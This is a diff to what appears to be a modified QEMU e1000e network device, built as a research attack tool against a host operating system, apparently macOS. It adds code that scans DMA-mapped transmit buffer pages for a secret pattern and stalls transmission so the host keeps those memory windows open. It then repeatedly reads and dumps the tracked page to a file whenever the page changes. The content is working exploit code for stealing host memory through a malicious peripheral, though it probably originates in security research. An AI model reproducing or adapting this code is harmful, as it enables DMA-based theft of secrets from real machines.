@@ -40,7 +40,7 @@
 #include "log.h"
 #include "mask.h"
 
-#include "hexdump.h"
+#include "crhexdump.h"
 #include "hw/hw.h"
 #include "hw/pci/pci.h"
 #include "net/net.h"
@@ -77,12 +77,15 @@
  * Attack tool kit types
  * ---------------------------------------------------------------------------
  */
+extern FILE *GLOBAL_BINARY_FILE;
+bool tracking_window;
 
 void attempt_to_subvert_windows(E1000ECore* core, hwaddr ba);
 void attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba);
 void print_rx_buffer_address_information(E1000ECore *core);
 void print_tx_buffer_address_information(E1000ECore *core);
 void record_tx_windows_from_tx_buffer(E1000ECore *core);
+void find_secret_window_to_track(E1000ECore *core);
 void record_tx_windows(E1000ECore *core);
 
 /*
@@ -1022,7 +1025,17 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
         return;
     }
 
-	/*record_tx_windows(core);*/
+	if (!tracking_window) {
+		find_secret_window_to_track(core);
+	}
+
+	if (tracking_window) {
+		/* If we now manage to find a window to track, point blank refuse to
+		 * send any more packets, in order to force the host to keep some
+		 * windows open.
+		 */
+		return;
+	}
 
     while (!_e1000e_ring_empty(core, txi)) {
         base = _e1000e_ring_head_descr(core, txi);
@@ -1068,7 +1081,7 @@ start_recv(E1000ECore *core)
 
     trace_e1000e_rx_start_recv();
 
-	print_rx_buffer_address_information(core);
+	/*print_rx_buffer_address_information(core);*/
 
     for (i = 0; i <= core->max_queue_num; i++) {
         qemu_flush_queued_packets(qemu_get_subqueue(core->owner_nic, i));
@@ -2673,7 +2686,7 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
     core->mac[index] = val & 0xffff;
 
 	/*PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));*/
-	print_tx_buffer_address_information(core);
+	/*print_tx_buffer_address_information(core);*/
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
     start_xmit(core, &txr);
@@ -3649,7 +3662,7 @@ case flag:																\
 #endif /* def VICTIM_MACOS */
 }
 
-static inline uint32_t
+inline uint32_t
 bswap24(uint32_t x)
 {
 	return ((x & 0xFF0000) >> 16) | (x & 0x00FF00) | ((x & 0x0000FF) << 16);
@@ -3745,7 +3758,10 @@ print_buffer_address_information(E1000ECore *core,
 struct window {
 	uint64_t base;
 	uint64_t length;
+	uint64_t checksum;
 };
+
+struct window tracked_window;
 
 static inline void
 print_window(const struct window * const entry)
@@ -3753,16 +3769,16 @@ print_window(const struct window * const entry)
 	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
 }
 
-void
-check_for_secret(struct window *window, uint8_t page[4096])
+bool
+window_contains_secret(struct window *window, uint8_t page[4096])
 {
 #define PATTERN_LENGTH 8
-	/*putchar('c');*/
+	/*putchar('s');*/
 	/*fflush(stdout);*/
 
-	int64_t j;
+	int64_t i, j;
 	uint64_t run_length = 1;
-	for (uint64_t i = 0; i < window->length; i += PATTERN_LENGTH) {
+	for (i = 0; i < window->length; i += PATTERN_LENGTH) {
 		if (page[i] == 'i') {
 			j = i;
 			while (run_length < PATTERN_LENGTH && --j >= 0 && page[j] == 'i') {
@@ -3777,12 +3793,7 @@ check_for_secret(struct window *window, uint8_t page[4096])
 			}
 		}
 	}
-	if (run_length == PATTERN_LENGTH) {
-		fputs("Found pattern in page: ", stdout);
-		print_window(window);
-		putchar('\n');
-		hexdump(page, window->length);
-	}
+	return (run_length >= PATTERN_LENGTH);
 #undef PATTERN_LENGTH
 }
 
@@ -3797,6 +3808,9 @@ int window_list_length, window_list_min_length, window_list_max_length;
  * elemeent constantly, so you still have the handle to the 'current' element
  * to remove afterwards. I used to do this, but then I basically had to write
  * the code again, and couldn't think of a good abstraction.
+ *
+ * XXX cr437: I have been quite stupid here. There is equally the macro
+ * SLIST_FOREACH_SAFE.
  */
 
 LIST_HEAD(window_list_head, window_list_entry) window_list_head
@@ -3823,6 +3837,7 @@ initialise_window_list()
 	window_list_min_length = 0;
 	window_list_max_length = 0;
 	start_time = clock();
+	tracking_window = false;
 }
 
 static inline void
@@ -3856,11 +3871,13 @@ window_in_list(struct window window)
 void
 check_windows_for_secret(E1000ECore *core)
 {
+	assert(false); /* XXX THIS USES FUNCTIONS THAT ARE BITROTTED FOR EXPERIMENT */
 	int read_result;
 	uint8_t page[4096];
 	struct window_list_entry *entry, *temp;
 
-	if ((clock() - start_time) < 40000) {
+	if ((clock() - start_time) < 20000) {
+		/*printf("%d\n", window_list_length);*/
 		return;
 	}
 
@@ -3870,13 +3887,24 @@ check_windows_for_secret(E1000ECore *core)
 		read_result = perform_dma_long_read(page, entry->window.length,
 			core->owner->devfn, 8, entry->window.base);
 		if (read_result == DRR_SUCCESS) {
-			check_for_secret(&(entry->window), page);
+			/*check_for_secret(&(entry->window), page);*/
 		} else {
 			LIST_REMOVE(entry, window_list);
 			free(entry);
 			adjust_window_list_length(-1);
 		}
 	}
+}
+
+uint64_t
+checksum_window(uint8_t page[4096])
+{
+	uint64_t sum = 0;
+	uint64_t *page_as_uint64 = (uint64_t *)page;
+	for (int i = 0; i < (4096 / sizeof(uint64_t)); ++i) {
+		sum += page_as_uint64[i];
+	}
+	return sum;
 }
 
 void
@@ -3896,20 +3924,68 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 
 	uint64_t window_page_base_address = page_base_address(window.base);
 
-	LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {
-		if (page_base_address(entry->window.base) == window_page_base_address) {
-			LIST_REMOVE(entry, window_list);
-			adjust_window_list_length(-1);
-			free(entry);
+	/* XXX: WINDOW TRACKING */
+	window.base = window_page_base_address;
+	window.length = 4096;
+
+	/*LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {*/
+		/*if (page_base_address(entry->window.base) == window_page_base_address) {*/
+			/*LIST_REMOVE(entry, window_list);*/
+			/*adjust_window_list_length(-1);*/
+			/*free(entry);*/
+		/*}*/
+	/*}*/
+
+	/*entry = malloc(sizeof(struct window_list_entry));*/
+	/*entry->window = window;*/
+	/*LIST_INSERT_HEAD(&window_list_head, entry, window_list);*/
+	/*adjust_window_list_length(1);*/
+
+	int read_result;
+	uint8_t page[4096];
+
+	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
+		window_page_base_address);
+
+	if (read_result == DRR_SUCCESS) {
+		if (window_contains_secret(&window, page)) {
+			putchar('s');
+			fflush(stdout);
+			tracking_window = true;
+			window.checksum = checksum_window(page);
+			tracked_window = window;
+			fwrite(page, 1, 4096, GLOBAL_BINARY_FILE);
 		}
+	} else {
+		printf("Couldn't read page! Weird :(.\n");
+	}
+}
+
+void
+write_window_if_changed(E1000ECore *core)
+{
+	int read_result;
+	uint8_t page[4096];
+	uint64_t new_checksum;
+
+	if (!tracking_window) {
+		return;
 	}
 
-	entry = malloc(sizeof(struct window_list_entry));
-	entry->window = window;
-	LIST_INSERT_HEAD(&window_list_head, entry, window_list);
-	adjust_window_list_length(1);
+	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
+		tracked_window.base);
 
-	check_windows_for_secret(core);
+	if (read_result == DRR_SUCCESS) {
+		new_checksum = checksum_window(page);
+		if (new_checksum != tracked_window.checksum) {
+			tracked_window.checksum = new_checksum;
+			fwrite(page, 1, 4096, GLOBAL_BINARY_FILE);
+			putchar('c');
+			fflush(stdout);
+		}
+	} else {
+		printf("Error reading held page.\n");
+	}
 }
 #endif
 
@@ -4143,7 +4219,7 @@ for_each_descriptor_address(E1000ECore *core, const E1000E_RingInfo *rxi,
 void
 print_rx_buffer_address_information(E1000ECore *core)
 {
-	printf("RX Buffer.\n");
+	/*printf("RX Buffer.\n");*/
     E1000E_RxRing rxr;
     const E1000E_RingInfo *rxi = rxr.i;
 
@@ -4161,7 +4237,7 @@ print_rx_buffer_address_information(E1000ECore *core)
 void
 print_tx_buffer_address_information(E1000ECore *core)
 {
-	printf("TX Buffer.\n");
+	/*printf("TX Buffer.\n");*/
 	E1000E_TxRing txr;
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
@@ -4170,14 +4246,16 @@ print_tx_buffer_address_information(E1000ECore *core)
 }
 
 void
-record_tx_windows(E1000ECore *core)
+find_secret_window_to_track(E1000ECore *core)
 {
-	fflush(stdout);
+	/* XXX PREMATURE EXIT XXX */
+
 	E1000E_TxRing txr;
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
 	for_each_descriptor_address(core, txi,
 		record_tx_windows_from_descriptor_address, NULL,
 		get_buffer_address_from_tx_descriptor);
+	/*check_windows_for_secret(core);*/
 }
 #endif
